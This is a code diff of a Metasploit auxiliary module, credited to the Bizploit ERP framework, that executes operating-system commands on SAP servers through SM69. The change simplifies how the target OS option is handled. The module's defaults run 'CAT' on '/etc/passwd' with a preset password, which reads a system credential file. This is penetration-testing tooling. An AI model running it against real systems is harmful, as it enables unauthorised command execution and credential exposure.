@@ -5,7 +5,7 @@
 
 ##
 # This module is based on, inspired by, or is a port of a plugin available in the Onapsis Bizploit Opensource ERP Penetration Testing framework - http://www.onapsis.com/research-free-solutions.php.
-# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts in producing the Metasploit modules and was happy to share his knowledge and experience - a very cool guy. 
+# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts in producing the Metasploit modules and was happy to share his knowledge and experience - a very cool guy.
 # Id also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis who have Beta tested the modules and provided excellent feedback. Some people just seem to enjoy hacking SAP :)
 ##
 
@@ -37,7 +37,7 @@ class Metasploit4 < Msf::Auxiliary
         OptString.new('PASS', [true, 'Password', '06071992']),
         OptString.new('CMD', [true, 'Command Name as in SM69', 'CAT']),
         OptString.new('PARAM', [true, 'Command Parameters', '/etc/passwd']),
-        OptEnum.new('OS', [true, 'Operating System 1. ANYOS, 2. UNIX, 3. Windows NT, 4. AS/400, 5. OS/400', '2', [1,2,3,4,5]]),
+        OptEnum.new('OS', [true, 'SM69 Target OS','ANYOS',['ANYOS', 'UNIX', 'Windows NT', 'AS/400', 'OS/400']])
       ], self.class)
   end
 
@@ -49,20 +49,7 @@ class Metasploit4 < Msf::Auxiliary
         fail_with(Exploit::Failure::BadConfig, "CLIENT in wrong format")
     end
 
-    case(datastore['OS'])
-    when '1'
-      os = "ANYOS"
-    when '2'
-      os = "UNIX"
-    when '3'
-      os = 'Windows NT'
-    when '4'
-      os = 'AS/400'
-    when '5'
-      os = 'OS/400'
-    else
-      fail_with(Exploit::Failure::BadConfig, "Invalid OS")
-    end
+    os = datastore['OS']
 
     exec_CMD(user,client,pass,rhost,datastore['rport'], datastore['CMD'], datastore['PARAM'], os)
   end
